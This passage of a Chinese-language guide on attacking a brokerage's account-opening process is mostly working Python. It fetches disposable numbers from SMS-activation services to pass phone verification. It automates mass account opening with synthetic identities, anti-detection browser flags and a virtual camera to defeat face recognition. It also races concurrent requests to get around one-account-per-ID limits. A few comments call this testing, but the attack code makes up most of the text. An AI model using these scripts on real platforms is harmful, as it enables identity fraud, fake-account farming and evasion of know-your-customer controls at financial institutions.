## 7. 批量注册与API滥用

### 7.1 接码平台与虚拟号段

```python
# === 手机号验证绕过 ===

# 1. 接码平台API
# 提供临时手机号接收验证码
# 成本: ¥0.5-2/次
# 平台: sms-activate.org, 5sim.net, 国内接码平台

import requests

def get_virtual_number(service="target_brokerage"):
    """通过接码平台获取虚拟号码"""
    # 获取可用号码
    resp = requests.get(f"https://sms-activate.org/stubs/handler_api.php", params={
        "api_key": "YOUR_API_KEY",
        "action": "getNumber",
        "service": service,
        "country": "0"  # 任意国家
    })
    # 返回: ACCESS_NUMBER:activation_id:phone_number
    return resp.text

def get_sms_code(activation_id):
    """获取验证码"""
    resp = requests.get(f"https://sms-activate.org/stubs/handler_api.php", params={
        "api_key": "YOUR_API_KEY",
        "action": "getStatus",
        "id": activation_id
    })
    # 返回: STATUS_OK:code
    return resp.text

# 2. 虚拟运营商号段
# 170/171号段: 虚拟运营商，部分系统未覆盖
# 测试: 是否拦截虚拟运营商号段
# 测试: 是否验证手机号实名信息

# 3. 国外号段
# 部分系统对国外号段验证宽松
# 测试: 是否允许+852/+1等号段注册
```

### 7.2 批量开户自动化

```python
# === 批量开户自动化脚本 ===

import asyncio
import aiohttp
from playwright.async_api import async_playwright

class MassAccountOpener:
    """批量开户自动化"""
    
    def __init__(self, target_url, identities):
        self.target_url = target_url
        self.identities = identities  # 合成身份列表
        self.results = []
    
    async def open_account(self, identity):
        """单个开户流程"""
        async with async_playwright() as p:
            # 使用反检测浏览器
            browser = await p.chromium.launch(
                headless=False,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--disable-features=IsolateOrigins,site-per-process',
                ]
            )
            context = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            page = await context.new_page()
            
            try:
                # 步骤1: 填写基本信息
                await page.goto(self.target_url)
                await page.fill("#name", identity["name"])
                await page.fill("#id_number", identity["id_number"])
                
                # 步骤2: 上传身份证照片
                await page.set_input_files("#id_front", identity["id_front_image"])
                await page.set_input_files("#id_back", identity["id_back_image"])
                
                # 步骤3: 人脸识别（使用虚拟摄像头）
                # 虚拟摄像头已在系统层面设置为默认设备
                await page.click("#start_face_recognition")
                await page.wait_for_selector("#face_success", timeout=30000)
                
                # 步骤4: 银行卡绑定
                await page.fill("#bank_card", identity["bank_card"])
                await page.fill("#bank_phone", identity["phone"])
                
                # 步骤5: 提交
                await page.click("#submit")
                
                result = await page.text_content("#result")
                self.results.append({
                    "identity": identity["name"],
                    "result": result,
                    "timestamp": time.time()
                })
            except Exception as e:
                self.results.append({
                    "identity": identity["name"],
                    "error": str(e)
                })
            finally:
                await browser.close()
    
    async def mass_open(self, batch_size=5):
        """分批开户，每批5个"""
        for i in range(0, len(self.identities), batch_size):
            batch = self.identities[i:i+batch_size]
            tasks = [self.open_account(identity) for identity in batch]
            await asyncio.gather(*tasks)
            # 批次间随机延迟
            await asyncio.sleep(random.uniform(30, 120))
```

### 7.3 并发绕过与竞态条件

```python
# === 开户竞态条件测试 ===

import threading
import requests

def race_condition_test():
    """测试并发开户竞态条件"""
    target_url = "https://api.target.com/account/open"
    
    # 同一身份证号并发开户
    headers = {"Authorization": "Bearer <token>"}
    payload = {
        "name": "测试用户",
        "id_number": "<IDCARD-REDACTED>",
        "bank_card": "6222021234567890123"
    }
    
    def open_account():
        resp = requests.post(target_url, json=payload, headers=headers)
        print(f"Status: {resp.status_code}, Response: {resp.text}")
    
    # 同时发起10个开户请求
    threads = []
    for i in range(10):
        t = threading.Thread(target=open_account)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

# 测试场景:
# 1. 同一身份证号并发开户（应只成功1次）
# 2. 同一手机号并发注册
# 3. 同一银行卡并发绑定
# 4. 优惠券/奖励并发领取
# 5. 邀请码并发使用
```

---

